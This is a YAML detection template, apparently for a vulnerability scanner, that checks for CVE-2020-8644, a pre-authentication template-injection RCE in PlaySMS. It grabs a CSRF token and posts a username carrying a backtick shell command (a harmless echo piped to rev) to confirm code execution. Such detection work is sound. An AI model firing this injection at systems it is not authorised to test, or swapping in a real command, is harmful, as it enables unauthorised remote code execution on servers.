name: yaml-poc-playsms_project-playsms-rce-CVE-2020-8644
binding: cc822687-d0e8-45fb-875a-fdff90e814bc
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/157106/PlaySMS-index.php-Unauthenticated-Template-Injection-Code-Execution.html
        - https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704
        - https://nvd.nist.gov/vuln/detail/CVE-2020-8644
        - https://packetstormsecurity.com/files/157106/PlaySMS-index.php-Unauthenticated-Template-Injection-Code-Execution.html
        - https://playsms.org/2020/02/05/playsms-1-4-3-has-been-released/
        - https://research.nccgroup.com/2020/02/11/technical-advisory-playsms-pre-authentication-remote-code-execution-cve-2020-8644/
        - https://www.exploit-db.com/exploits/48335
    vulnerability:
        id: 326db422-d485-45b6-8f25-a181ee80b0c7
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomLowercase(11)
    BaseURL: request.url.scheme + "://" + request.url.domain
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?app=main&inc=core_auth&route=login
            headers:
                Origin: '{{BaseURL}}'
            follow_redirects: false
        expression: response.status == 200
        output:
            csrf: '"(?P<csrf>[0-9a-z]{32})".submatch(response.body_string)["csrf"]'
    r1:
        request:
            cache: true
            method: POST
            path: /index.php?app=main&inc=core_auth&route=login&op=login
            headers:
                Content-Type: application/x-www-form-urlencoded
                Origin: '{{BaseURL}}'
            body: X-CSRF-Token={{csrf}}&username=%7B%7B%60echo%20%27{{s1}}%27%20%7C%20rev%60%7D%7D&password=
            follow_redirects: true
        expression: response.status == 200 && response.body_string.contains(rev(s1))
expression: r0() && r1()
